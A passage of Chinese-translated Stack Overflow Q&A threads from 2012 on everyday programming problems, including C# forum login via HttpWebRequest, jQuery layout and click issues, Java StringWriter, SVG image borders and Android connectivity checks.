...到...

```
for (int i=0; i<4; i++) { 
```

您正在迭代一个超出数组大小的数组，得到`ArrayIndexOutOfBoundsException`异常。

您还需要在第二个循环中考虑到这一点。

# c# - 无法使用 HttpWebRequests 登录

> ID：13217647
> 
> 赞同：1
> 
> 时间：2012-11-04T10:10:52.027
> 
> 标签：c#, login, httpwebrequest, httpwebresponse, vbulletin

我正在尝试使用 httpwerequests 登录论坛，但到目前为止我没有成功，这是我的代码：

```
string url = "http://www.warriorforum.com/";

var bytes = Encoding.Default.GetBytes(@"vb_login_username=MyUsername&cookieuser=1&vb_login_password=&s=&securitytoken=guest&do=login&vb_login_md5password=d9350bad28eee253951d7c5211e50179&vb_login_md5password_utf=d9350bad28eee253951d7c5211e50179");
var container = new CookieContainer();

var request = (HttpWebRequest)(WebRequest.Create(url));
request.CookieContainer = container;
request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/535.2";
request.ContentLength = bytes.Length;
request.Method = "POST";
request.KeepAlive = true;
request.AllowAutoRedirect = true;
request.AllowWriteStreamBuffering = true;
request.CookieContainer = container;
using (var requestStream = request.GetRequestStream())
    requestStream.Write(bytes, 0, bytes.Length);

var requestResponse = request.GetResponse();
using (var responsStream = requestResponse.GetResponseStream())
{
    if (responsStream != null)
    {
        using (var responseReader = new StreamReader(responsStream))
        {
            var responseStreamReader = responseReader.ReadToEnd();
            richTextBox1.Text = responseStreamReader; //this is to read the page source after the request
        }
    }
} 
```

请求后响应只是同一页面，没有任何变化，没有消息告诉我我输入了错误的密码或类似的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:21:13.400

当您登录时，您似乎遗漏了浏览器所做的某些事情……该论坛真的需要 a`POST`或者也许 a`GET`吗？你所有的参数都正确吗？当从浏览器登录时，网页是否可能发送附加参数（隐藏）？

当您通过浏览器手动登录时，您需要查看真正通过网络传输的内容 - 使用[Wireshark](http://www.wireshark.org/)或[Fiddler](http://www.fiddler2.com/fiddler2/)找出并模拟代码中发生的情况......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T11:30:55.250

我刚刚使用我的通用 VBulletin 登录功能进行了测试，它似乎工作正常：

```
private static bool VBulletinLogin(Uri loginUrl, string user, string password)
{
    var postParams = new[] {
        new HttpParam("vb_login_username", user),
        new HttpParam("cookieuser", "1"),
        new HttpParam("vb_login_password", password),
        new HttpParam("securitytoken", "guest"),
        new HttpParam("do", "login"),
    };

    var http = new HttpContext();
    var src = http.GetEncodedPageData(loginUrl, HttpRequestType.POST, postParams);
    return src.ResponseData.Contains("Thank you for logging in");
} 
```

不幸的是，这使用了我的`HttpContext`类，它是我一直在编写的库的一部分，并且这些功能相互交织在一起。但是，希望它至少能让您对 post 参数有所了解。我还从我自己的类中包含了一些有用的结构/函数，它们应该会有所帮助。（注意，需要引用 .NET 3.5`System.Web`命名空间。

第一个有用的结构，HttpParam：

```
public struct HttpParam
{
    private string _key;
    private string _value;

    public string Key { get { return HttpUtilty.UrlEncode(_key); } set { _key = value; } }
    public string Value { get { return HttpUtility.UrlEncode(_value); } set { _value = value; } }

    public HttpParam(string key, string value)
    {
        _key = key;
        _value = value;
    }

    public override string ToString()
    {
        return string.Format("{0}={1}", Key, Value);
    }
}; 
```

以及与之配套的功能：

```
private static string GetQueryString(HttpParam[] args)
{
    return args != null
            ? string.Join("&", Array.ConvertAll(args, arg => arg.ToString()))
            : string.Empty;
} 
```

这些组合将帮助您生成一致、安全的查询字符串。所以在上述情况下：

```
var postParams = new[] {
    new HttpParam("vb_login_username", user),
    new HttpParam("cookieuser", "1"),
    new HttpParam("vb_login_password", password),
    new HttpParam("securitytoken", "guest"),
    new HttpParam("do", "login"),
};

var queryString = GetQueryString(postParams); 
```

会给你类似的东西：

```
vb_login_username=<user>&cookieuser=1&vb_login_password=<password>&securitytoken=guest&do=login 
```

然后可以使用与您已经发布的内容类似的内容，只需确保您拥有正确的 URL。在获取查询字符串字节时，我也会使用`UTF8`编码。例如（使用您的原始代码，稍作修改）

```
var postParams = new[] {
    new HttpParam("vb_login_username", "yourusername"),
    new HttpParam("cookieuser", "1"),
    new HttpParam("vb_login_password", "yourpassword"),
    new HttpParam("securitytoken", "guest"),
    new HttpParam("do", "login"),
};

string url = "http://warriorforum.com/login.php?do=login";
var container = new CookieContainer();
var buffer = Encoding.UTF8.GetBytes(GetQueryString(postParams));

var request = (HttpWebRequest)HttpWebRequest.Create(url);
request.CookieContainer = container;
request.UserAgent = "Mozilla/5.0";
request.Method = "POST";
request.KeepAlive = true;
request.AllowAutoRedirect = true;
request.CookieContainer = container;
request.ContentLength = buffer.Length;
request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";

using (var requestStream = request.GetRequestStream())
    requestStream.Write(buffer, 0, buffer.Length);

using (var response = request.GetResponse())
{
    if (response.StatusCode == HttpStatusCode.OK || response.StatusCode == HttpStatusCode.NotModified)
    {
        using (var reader = new StreamReader(response.GetResponseStream()))
        {
            var result = reader.ReadToEnd();
            richTextBox1.Text = result; //this is to read the page source after the request
        }
    }
} 
```

还要注意与 的变化`ContentType`。

# jquery - Firefox Bug 或错误的 JS

> ID：13217653
> 
> 赞同：1
> 
> 时间：2012-11-04T10:11:44.087
> 
> 标签：jquery, firefox

我对一个代码有一点问题。

的HTML：

```
<div id="navigation">
 <ul>
  <li><a href="#">Link</a></li>
  <li><a href="#">Link</a></li>
  <li><a href="#">Link</a></li>
  <li><a href="#">Link</a></li>
  <li><a href="#">Link</a></li>
  <li><a href="#">Link</a></li>
  <li><a href="#">Link</a></li>
 </ul>          
</div> 
```

简单的 CSS，只是为了显示问题：

```
* { margin: 0; padding: 0; }
.shell {  width: 960px; margin: 0 auto; }

#navigation { background: red; height: 18px; }
#navigation ul { float: left; display: inline;  }
#navigation ul li { float: left; display: inline;  }
#navigation ul li a { float: left; display: inline;  font-size:  14px; line-height: 18px; color:#000; }
#navigation ul li a:hover { background:blue; } 
```

和 JS（使用 jQuery）

```
var padWidthModule = ($('#navigation').width() - $('#navigation ul').width())%$('#navigation ul li').length,
padWidthParse = parseInt(($('#navigation').width() - $('#navigation ul').width())/$('#navigation ul li').length),
padHalfWidthModule = padWidthParse%2,
padHalfWidthParse = parseInt(padWidthParse/2),
module = (padWidthModule + padHalfWidthModule)%2;
moduleParse = parseInt((padWidthModule + padHalfWidthModule)/2);
if (padHalfWidthModule==0) {
    $('#navigation ul li a').css({
        'paddingLeft': padHalfWidthParse,
        'paddingRight': padHalfWidthParse
    })
}else{
    $('#navigation ul li a').css({
        'paddingLeft': padHalfWidthParse,
        'paddingRight': padHalfWidthParse+1
    })
}
if (module == 0) {
    $('#navigation ul li:last a').css({
        'paddingLeft': padHalfWidthParse+moduleParse,
        'paddingRight': padHalfWidthParse+moduleParse
    })
}else {
    $('#navigation ul li:last a').css({
        'paddingLeft': padHalfWidthParse+moduleParse,
        'paddingRight': padHalfWidthParse+moduleParse+1
    })
}
setTimeout(function() {
    var liSum = 0,
        pixelDifference = 0;
    if($('#navigation ul li:first').position().top != $('#navigation ul li:last').position().top){
        $('#navigation ul li').each(function(){
            liSum += $(this).outerWidth(true);
        })
        pixelDifference = $('#navigation').width()-liSum;
        console.log(liSum)
        $('#navigation ul li:last a').css({
            'paddingLeft': padHalfWidthParse+moduleParse-pixelDifference
        });
    }
}, 1); 
```

几乎代码应该为导航元素添加动态填充以填充导航宽度，而没有空格。

你问的问题？该代码在 IE6、IE7.IE8、IE9、Safari、Opera、Chrome 下测试，工作正常，没有问题……但问题来自 Windows 7 和 MAC 下的 FireFox（在 XP 下没有问题）。在 Firefox 中，最后一个元素属于导航。如果您在 JS 中看到我只是为此添加了一个 setTimeout 函数，那么它的唯一目的就是修复有缺陷的 FireFox。

但是还有更多，我留下了一个 console.log(liSum) 计算所有“li”元素的宽度，在 JS 将其填充到它们之后，它应该显示 597px（在 FireFox 下）。所以我们从最后一个元素中减去了 3px 的差异......但是让我们停在这里，这听起来不是很可疑吗？我们有一个宽度为 960px 的盒子，以及总和为 957px 的列表元素，谁似乎无法放入盒子中......？如果我的数学是正确的 957<960 所以它们毕竟应该适合......但是不......（你应该注意到，如果问题是元素的宽度大于 960px 我会减去它们的宽度和导航的宽度，但事实并非如此）所以在减法之后你会看到最后一个导航元素之后还有一些空间。（实际上我可以对其进行硬编码并从最后一项中减去 1，

如果 setTimeout 被移除，最后一个元素会掉落，但是如果我们打开 FireBug 并从最后一个元素中移除 1px，它会捕捉到导航框，但最后仍然会有一点空间。

有什么想法可以解决吗？（问题出在哪里）

（对不起，如果我的英语不好）

jsfiddle：http: [//jsfiddle.net/utWda/](http://jsfiddle.net/utWda/)

> 屏幕：
> 
> （坏）FireFox Win7（带setTime功能）：http: [//i.imgbox.com/adoAy24C.jpg](http://i.imgbox.com/adoAy24C.jpg)
> 
> （坏）FireFox Win7（没有 setTime）：http: [//i.imgbox.com/ads6Ldvu.jpg](http://i.imgbox.com/ads6Ldvu.jpg)
> 
> （好）歌剧：http: [//i.imgbox.com/acqkLzGy.jpg](http://i.imgbox.com/acqkLzGy.jpg)
> 
> （好）FireFox XP：http: [//i.imgbox.com/abudcEOp.jpg](http://i.imgbox.com/abudcEOp.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T03:59:37.043

你的问题大概是 jQuery 把你搞砸了。

这样做的方式是 jQuery`width()`返回四舍五入到最近像素的宽度。但是 CSS 框的实际宽度不必是整数像素。在您的情况下，假设每个链接的宽度比整数大 0.45px。然后，如果将它们四舍五入到最接近的像素后的宽度总和比总宽度小 3 像素，那么所有 7 个链接宽度的总和实际上将比总宽度*大*0.15 像素，并且正如您所发现的那样，事情将会中断。

要解决此问题，您应该使用 getBoundingClientRect() 进行大小计算。并向 jQuery 开发人员投诉以修复 jQuery 的`width()`...

# java - 如何将流结果转换为字符串

> ID：13217657
> 
> 赞同：23
> 
> 时间：2012-11-04T10:12:22.323
> 
> 标签：java, dom, filestream

我想将流结果输出转换为字符串，因为我想在 Junit 中使用它我认为我需要使用字符串编写器，但我不确定如何准确使用它。

```
StreamResult result = new StreamResult(new File("C:\\file.xml"));
transformer.transform(source, result); 
```

谢谢费多尔

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-11-04T10:44:59.233

查看并学习使用 StreamResult 类的 javadocs ( [http://java.sun.com/javase/6/docs/api/](http://java.sun.com/javase/6/docs/api/) )。StreamResult 的构造函数之一将 Writer 对象作为参数。您将看到 Writer 的子类之一是 StringWriter。因此，要从写入 StreamResult 的内容中获取字符串，可以构造一个 StringWriter，将其放入 StreamResult，将 Source 转换（）到 StreamResult，然后从 StringWriter 中获取字符串。

```
//create a StringWriter for the output
StringWriter outWriter = new StringWriter();
StreamResult result = new StreamResult( outWriter );
...
transformer.transform( source, result );  
StringBuffer sb = outWriter.getBuffer(); 
String finalstring = sb.toString(); 
```

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2012-11-04T10:44:21.967

```
StringWriter writer = new StringWriter();
transformer.transform(source, new StreamResult(writer));
String output = writer.toString(); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-04T10:44:03.560

您可以通过这种方式使用[StringWriter](http://docs.oracle.com/javase/7/docs/api/java/io/StringWriter.html)：

```
StringWriter sw = (StringWriter) result.getWriter(); 
StringBuffer sb = sw.getBuffer(); 
String finalstring = sb.toString(); 
```

# jfreechart - 初始化 JFreeChart 范围轴值

> ID：13217658
> 
> 赞同：0
> 
> 时间：2012-11-04T10:12:29.360
> 
> 标签：jfreechart

我正在尝试在 JFreeChart 初始化期间加载数据集。但是每次我尝试创建具有更高“每个系列的项目数”的数据集时，图表中显示的数据（所有数据）越多（数据集越大，图表越小）。但实际上我想要的是在图表上显示固定范围的数据集值，而其余的仍然隐藏。就像数据在实际交易平台中通常显示的方式一样，比如 Metatrader (MT4)。第一次打开图表时，我可以看到屏幕上充满了图表唯一可见的数据集，如果我左滚动图表，我也可以看到旧的/历史数据集。有谁知道如何使用 JFreechart 实现这一目标？

非常感谢我可以参考的任何帮助或任何事情/文章。非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T12:43:07.657

您可以`setRange()`在域或范围轴上使用，如本[片段](https://stackoverflow.com/a/13205322/230513)所示。如果您已经尝试过此操作，则编辑您的问题以包含显示您遇到的任何问题的[sscce和/或图像可能会有所帮助。](http://sscce.org/)

# objective-c - “缓存图像”和“本地图像”有什么区别？

> ID：13217662
> 
> 赞同：0
> 
> 时间：2012-11-04T10:12:43.403
> 
> 标签：objective-c, ios, afnetworking

我是初学者。我想在TableView上通过urls显示图片，所以我使用AFNetworking+SDURLCache，如下图

```
// init URLCache
SDURLCache *URLCache = [[SDURLCache alloc] initWithMemoryCapacity:1024*1024*2 diskCapacity:1024*1024*20 diskPath:[SDURLCache defaultCachePath]];
[URLCache setIgnoreMemoryOnlyStoragePolicy:YES];
[SDURLCache setSharedURLCache:URLCache]; 
```

==================================================== ======

```
// set cell    
[cell.imageView setImageWithURL:[NSURL URLWithString:IMAGE_URL] placeholderImage:[UIImage imageNamed:@"placeholder.png"]];
[[SDURLCache sharedURLCache] cachedResponseForRequest:[NSURLRequest requestWithURL:[NSURL URLWithString:IMAGE_URL]]]; 
```

在这里，我在所有不同的单元格上使用图像。一切正常！当我第一次运行我的项目时，在单元格上显示图像需要很长时间，因为我的网络图像非常大。当我第二次运行我的项目时，我发现 TableView 会立即一张一张地加载图像？为什么？为什么不立即加载所有图像。我将缓存的图像替换为本地图像，TableView 一次加载图像。“缓存图像”和“本地”图像有什么区别？SDURLCache 不起作用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T10:21:17.687

我没有 iOS 经验，但我认为缓存的图像是存储在 Web 客户端缓存中的图像，以便它可以更快地加载该资源，除非该资源已被修改并且缓存版本在放入缓存。

我认为，本地图像是存储在设备本身上的图像。显然，这将比下载它更快，因为 iDevices 上的存储由 NAND 闪存芯片等组成，远远超过国内互联网连接。

# jquery - jquery mousemove 和 click 处理程序，不能点击另一个 div

> ID：13217666
> 
> 赞同：1
> 
> 时间：2012-11-04T10:13:08.223
> 
> 标签：jquery, html

我有一个小问题，我不知道如何处理它。我有自定义鼠标，我用 jQuery mousemove 函数制作了它（下面是光标图像）：

```
$('.mainBody').mousemove(function(e){
            $('.follow').show();
            $('.mainBody').css('cursor', 'none');               
            $(".follow").css({left:e.pageX-40, top:e.pageY-150}); }); 
```

html 代码如下所示：

```
<div class="mainBody">
        <a href="index2.html" class="button1"></a>
        <div class="follow"></div>
</div> 
```

当鼠标点击某处时，我制作了一个自定义图像：

```
$('.mainBody').click( function(){
        $(".follow").css({background:'url("images/cursor_click.png")', width: 210, height:210});
        $(".follow").animate({ opacity: 1 }, 200, function(){
            $(".follow").css({background:'url("style/images/cursor.png")', width: 115, height:185});
        });
}); 
```

在此点击代码中，0.2 秒显示另一个图像并返回正常状态。当我尝试创建另一个点击功能时，问题就来了：

```
 $('.button1').click( function(){
            alert('clicked');
        }); 
```

当我单击类按钮 1 时，不会出现警报。我试图改变但仍然没有，我尝试了这段代码：

```
 $('.mainBody').click( function(){
            $(".follow").css({background:'url("style/images/cursor_click.png")', width: 210, height:210});
            $(".follow").animate({ opacity: 1 }, 200, function(){
                $(".follow").css({background:'url("style/images/cursor.png")', width: 115, height:185});
            });
            $('.button1').click( function(){
                alert('clicked');
            });
        }); 
```

，但仍然没有。我尝试了很多动作，但对我没有任何帮助。也许你知道问题可能出在哪里？

如果我删除`$('.mainBody').click(...);`处理程序，`$('.button1').click(...)`仍然不工作，所以也许有问题`mousemove`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:19:39.950

您的问题是客户端除了 on 之外没有看到任何其他点击，`$('.follow')`因为它始终是 ACTUAL 鼠标光标下的那个 - 其他所有内容都被忽略，因为事件看起来不比`.follow`. 我不建议您以这种方式更改光标。使用`css`光标设置，这个问题就会消失。

**编辑：**

因此，如果您 100% 必须使用这些巨大的光标，您可以以稍微不同的方式处理点击事件。首先`dom`为您可能需要监听点击的每个元素记录树中的每个位置：

```
function record_node_positions() {
    window.nodes = {
        node : {}
    };
    $( 'body *' ).each(function( index ) {
        window.nodes.node[ $( this ).attr( 'id' ) ] = {
            id      : $( this ).attr( 'id' ),           

            top     : $( this ).offset().top,
            left    : $( this ).offset().left,
            width   : $( this ).outerWidth(),
            height  : $( this ).outerHeight()
        };

        window.nodes.node[ $( this ).attr( 'id' ) ].right = window.nodes.node[ $( this ).attr( 'id' ) ].left + window.nodes.node[ $( this ).attr( 'id' ) ].width;
        window.nodes.node[ $( this ).attr( 'id' ) ].bottom = window.nodes.node[ $( this ).attr( 'id' ) ].top + window.nodes.node[ $( this ).attr( 'id' ) ].height;
    });
} 
```

然后onload记录它们`$( window ).load(function() { record_node_positions(); });`

拼图的第二部分是查找功能，当您点击时，您将需要它来查找点击区域内占据空间的所有元素。

```
function find_node_with_position( positionTop, positionLeft ) {

    var results = [];

    $.each( window.nodes.node, function( key, value ) {

        if ( positionTop >= window.nodes.node[ key ].top && positionTop <= window.nodes.node[ key ].bottom ) {
            if ( positionLeft >= window.nodes.node[ key ].left && positionLeft <= window.nodes.node[ key ].right ) {
            // This node fits into the search, return it

                results.push( window.nodes.node[ key ] );

            }
        }

    });

    if ( results.length < 1 )
        results = null;

    return results;
} 
```

最后，一旦发生点击，只需从结果中选择您需要的内容，在这种情况下，它是所有返回的元素中的最后一个元素

```
$(window).on('click', function(event_handle) {
    var objects_clicked = find_node_with_position( event_handle.pageY, event_handle.pageX );

    if ( objects_clicked != null ) {
        var object_clicked = objects_clicked[ objects_clicked.length-1 ].id
        console.log(object_clicked);
    }
}); 
```

希望这是有用的。

# svg - 带有边框/笔划的 SVG 图像

> ID：13217669
> 
> 赞同：22
> 
> 时间：2012-11-04T10:13:23.103
> 
> 标签：svg

我正在尝试在 svg 图像周围添加边框。我尝试了两种方法，但都失败了......

尝试1：绘制图像但没有边框..

```
<image id="note-0" xlink:href="http://example.com/example.png" x="185" y="79" height="202" width="150" style="stroke:#ac0d0d; stroke-width:3;"></image> 
```

尝试2：绘制图像但没有边框..

```
<defs>
    <image id="image1352022098990svg" height="202" width="150" xlink:href="http://example.com/example.png"></image>
</defs>

<use xmlns="http://www.w3.org/2000/svg" id="note-0" xlink:href="#image1352022098990svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="185" y="79" height="202" width="150" style="stroke:#ac0d0d; stroke-width:3;"/> 
```

所以我的问题是，是否可以在 svg 元素上定义图像并同时在其周围设置边框/描边？

此外，我似乎可以使用 translate 和 x/y 属性来定位 svg 元素。哪个是首选，为什么？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-11-04T10:35:02.400

[stroke](http://www.w3.org/TR/SVG/painting.html#StrokeProperties)不适用于`<image>`or `<use>`，仅适用于形状和文本。如果你想在它周围画一个边框，`<rect>`在图像后面画一个与图像相同的 x、y、宽度和高度，并给它一个笔触和一个“无”填充。

至于翻译与 x/y - 这取决于您的用例。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2019-11-11T13:09:13.613

如果由于某种原因您无法更改 SVG 元素，则可以使用 outline CSS 属性的解决方法：

```
#note-0 {
    outline: 6px solid white;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-03-18T12:37:10.687

如果您需要它环绕圆形图像（例如 svg 形状），并且您只需要一些颜色来勾勒它，您可能会发现这样的东西很有用：

```
image { 
    filter: drop-shadow(0px 0px 1px red);
} 
```

# android - 非最终变量还是全局变量？我想加 1 然后循环回来但是如何

> ID：13217675
> 
> 赞同：0
> 
> 时间：2012-11-04T10:14:47.537
> 
> 标签：android

我对 java 和 android dev 完全陌生，所以希望我能很好地描述我正在努力实现的目标（因此，为什么我的代码中也有这么多评论，请尝试帮助我）。

我在要显示的资产文件夹中有一组图片，当单击 ibnext 按钮时，我希望图片（和相关的 txt 文件）更改为下一张。为简单起见，txt 文件和图片的名称分别为 1.txt 和 1.jpg、2.txt 和 2.jpg 等。

以下是我的代码，它都适用于显示第一个图像和 txt，但我无法达到可以将 1 添加到“progressL1”然后重绘图像和 txt 的地步。我陷入了搜索非最终变量和全局变量的循环中，这对我来说没有多大意义。

请得到很好的帮助，对不起，这是一个新手问题，但我对此感到茫然......

```
public class Lessonsinglegroup extends Activity implements OnInitListener {

//define the image and text view for use later
ImageView Image;
TextView Text;

//define the texttospeak stuff

private int MY_DATA_CHECK_CODE = 0;
public int progressL1 = 0;
private TextView inputText;
private TextToSpeech tts;
private ImageButton speakButton;
private ImageButton nextButton;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_lessonsinglegroup);
    getActionBar().setDisplayHomeAsUpEnabled(true);

    //link the image and text boxes to the xml
    Image = (ImageView)findViewById(R.id.image);
    Text = (TextView)findViewById(R.id.text);
    loadDataFromAsset(progressL1);

    //finish with the asset load

    //define tts stuff
    inputText = (TextView) findViewById(R.id.text);
    speakButton = (ImageButton) findViewById(R.id.ibtalk);
    nextButton = (ImageButton) findViewById(R.id.ibnext);

    //start the speech stuff
    speakButton.setOnClickListener(new View.OnClickListener() {

    public void onClick(View v) {
        String text = inputText.getText().toString();
        if (text!=null && text.length()>0) {
            tts.speak(text, TextToSpeech.QUEUE_ADD, null);
        }
    }
    });

    Intent checkIntent = new Intent();
        checkIntent.setAction(TextToSpeech.Engine.ACTION_CHECK_TTS_DATA);
        startActivityForResult(checkIntent, MY_DATA_CHECK_CODE);

        }
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
if (requestCode == MY_DATA_CHECK_CODE) {
    if (resultCode == TextToSpeech.Engine.CHECK_VOICE_DATA_PASS) {
        //sucess with TTS create it
        tts = new TextToSpeech(this, this);
        }
    else {
        //missing TTS so install it
        Intent installIntent = new Intent();
        installIntent.setAction(TextToSpeech.Engine.ACTION_INSTALL_TTS_DATA);
        startActivity(installIntent);
    }
}

}

public void onInit(int status) {
    if (status == TextToSpeech.SUCCESS) {
        Toast.makeText(Lessonsinglegroup.this, "Text to Speech initialised", Toast.LENGTH_LONG).show();
            }
    else if (status == TextToSpeech.ERROR) {
        Toast.makeText(Lessonsinglegroup.this, "Error starting Text to Speech",     Toast.LENGTH_LONG).show();
    }
}

//actually load the text file and image file   
public void loadDataFromAsset(int progressL1) {
    //load the asset files themselves
    try {
        InputStream is = getAssets().open(progressL1 + ".txt");
        //check file size
        int size = is.available();
        //create a buffer to handle it
        byte[] buffer = new byte[size];
        //send the data to the buffer
        is.read(buffer);
        //close the stream down
        is.close();
        //set the text we recovered to the TextView
        Text.setText(new String(buffer));
    }
    catch (IOException ex) {
        return;
    }

    //image file next
    try {
        InputStream ims = getAssets().open(progressL1 + ".jpg");
        //load the image as drawable
        Drawable d = Drawable.createFromStream(ims,  null);
        //set the drawable image to the imageview
        Image.setImageDrawable(d);
    }
    catch (IOException ex) {
        return;
            }

//end of image and text file loading.

//when next is clicked start doing this
nextButton.setOnClickListener(new View.OnClickListener() {

      public void onClick(View v) {
          try {
              progressL1++;
              Lessonsinglegroup.loadDataFromAsset();
          }
          catch (IOException ex) {
                return;
                    }
      }   
          });
      } 
```

==================================================== ==================================================== =================================编辑================= ==============================

有了一些更整洁的代码，我认为我更接近我想要的，但我仍然不知道在 progressL1 为 ++ 之后如何调用公共 loadDataFromAsset 部分。

我认为这段代码更好？有人想吗？

```
public class Lessonsinglegroup extends Activity implements OnClickListener, OnInitListener {
//old version did not have OnClcikListener in it here-------------->

//define the image and text view for use later
ImageView Image;
TextView Text;

//define the texttospeak stuff

private int MY_DATA_CHECK_CODE = 0;
public int progressL1 = 0;
private TextView inputText;
private TextToSpeech tts;
private ImageButton speakButton;
private ImageButton nextButton;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_lessonsinglegroup);
    getActionBar().setDisplayHomeAsUpEnabled(true);

    //link the image and text boxes to the xml
    Image = (ImageView)findViewById(R.id.image);
    Text = (TextView)findViewById(R.id.text);
    loadDataFromAsset(progressL1);

    //finish with the asset load

    //define tts stuff
    inputText = (TextView) findViewById(R.id.text);
    speakButton = (ImageButton) findViewById(R.id.ibtalk);
    nextButton = (ImageButton) findViewById(R.id.ibnext);

    //start the speech stuff
//    speakButton.setOnClickListener(new View.OnClickListener() {

    //new onclick listener style

    speakButton.setOnClickListener(this);
    nextButton.setOnClickListener(this);

}
    public void onClick(View v) {
        if (v==nextButton) {
            progressL1++;
            Toast.makeText(Lessonsinglegroup.this, "progress +1", Toast.LENGTH_LONG).show();
        //HERE IS WHERE I AM CONFUSED HOW TO CALL FORWARD-------<<<<<<  

        }

        if (v==speakButton){

        String text = inputText.getText().toString();
        if (text!=null && text.length()>0) {
            tts.speak(text, TextToSpeech.QUEUE_ADD, null);
        }

    };

    Intent checkIntent = new Intent();
        checkIntent.setAction(TextToSpeech.Engine.ACTION_CHECK_TTS_DATA);
        startActivityForResult(checkIntent, MY_DATA_CHECK_CODE);

        }
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
if (requestCode == MY_DATA_CHECK_CODE) {
    if (resultCode == TextToSpeech.Engine.CHECK_VOICE_DATA_PASS) {
        //sucess with TTS create it
        tts = new TextToSpeech(this, this);
        }
    else {
        //missing TTS so install it
        Intent installIntent = new Intent();
           installIntent.setAction(TextToSpeech.Engine.ACTION_INSTALL_TTS_DATA);
        startActivity(installIntent);
    }
}

}

public void onInit(int status) {
    if (status == TextToSpeech.SUCCESS) {
        Toast.makeText(Lessonsinglegroup.this, "Text to Speech initialised", Toast.LENGTH_LONG).show();
            }
    else if (status == TextToSpeech.ERROR) {
        Toast.makeText(Lessonsinglegroup.this, "Error starting Text to Speech", Toast.LENGTH_LONG).show();
    }
}

//actually load the text file and image file   
public void loadDataFromAsset(int progressL1) {
    //load the asset files themselves
    try {
        InputStream is = getAssets().open(progressL1 + ".txt");
        //check file size
        int size = is.available();
        //create a buffer to handle it
        byte[] buffer = new byte[size];
        //send the data to the buffer
        is.read(buffer);
        //close the stream down
        is.close();
        //set the text we recovered to the TextView
        Text.setText(new String(buffer));
    }
    catch (IOException ex) {
        return;
    }

    //image file next
    try {
        InputStream ims = getAssets().open(progressL1 + ".jpg");
        //load the image as drawable
        Drawable d = Drawable.createFromStream(ims,  null);
        //set the drawable image to the imageview
        Image.setImageDrawable(d);
    }
    catch (IOException ex) {
        return;
            }

      } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T12:04:21.680

你的问题还是很不清楚。我认为您的意思是“我如何从 onClick 中调用 loadDataFromAsset？”

您的 onClick 是一个“匿名内部类”。要调用外部类 Lessonsinglegroup 中的方法，请使用以下命令：

```
Lessonsinglegroup.this.loadDataFromAsset() 
```

# android - 如何检查在android中连接的真实互联网？

> ID：13217676
> 
> 赞同：7
> 
> 时间：2012-11-04T10:14:55.067
> 
> 标签：android, wifi

我做了一个程序，我必须使用wifi连接互联网。我找到了一些信息来检查wifi是否连接。但是在某些情况下，您可以连接wifi AP，但您仍然无法上网，例如wifi需要帐户和密码才能在https中进行证书，或者wifi AP无法上网。那么，如何检查真正的互联网连接呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T10:36:49.773

只需对 www.google.com 进行“Ping”，他们失败的可能性非常低。

PS这是我们在我们的应用程序中所做的..

```
public static boolean isReachable(Context context) {
    //  First, check we have connectivity
    final ConnectivityManager connMgr = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
    final NetworkInfo netInfo = connMgr.getActiveNetworkInfo();

    if (netInfo != null && netInfo.isConnected()) {
        //  check if google is reachable
        try {
            URL url = new URL("http://www.google.com");
            HttpURLConnection urlc = (HttpURLConnection) url.openConnection();
            urlc.setRequestProperty("Connection", "close");
            urlc.setConnectTimeout(10 * 1000); // Ten seconds timeout in milliseconds
            urlc.connect();
            if (urlc.getResponseCode() == 200) { // success
                return true;
            } else { // Fail
                return false;
            }
        } catch (IOException e) {
            Log.e(TAG, e.getMessage());
            return false;
        }
    } else {
        return false;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T11:01:47.927

请参考以下：

创建一个返回布尔值的方法：

```
 ConnectivityManager connectivityManager;
    NetworkInfo wifiInfo, mobileInfo;

    public Boolean checkNow(Context con){
    try{
        connectivityManager = (ConnectivityManager) con.getSystemService(Context.CONNECTIVITY_SERVICE);
        wifiInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        mobileInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);  

        if(wifiInfo.isConnected() || mobileInfo.isConnected())
        {
            return true;
        }
    }
    catch(Exception e){
        System.out.println("CheckConnectivity Exception: " + e.getMessage());
    }

    return false;
} 
```

在您的方法中使用上述方法，如下所示`onCreate()`：

```
 @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

       boolean con = checkNow(getApplicationContext());

       if(con){
           Toast.makeText(getApplicationContext(), "Connection Founded", Toast.LENGTH_SHORT).show();
       }else{
           Toast.makeText(getApplicationContext(), "Connection Not Founded", Toast.LENGTH_SHORT).show();
       }

} 
```

当您运行该应用程序时，您将提示`"Connection Founded"`您的设备是否有互联网连接，否则会提示`"Connection Not Founded"`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T10:53:12.927

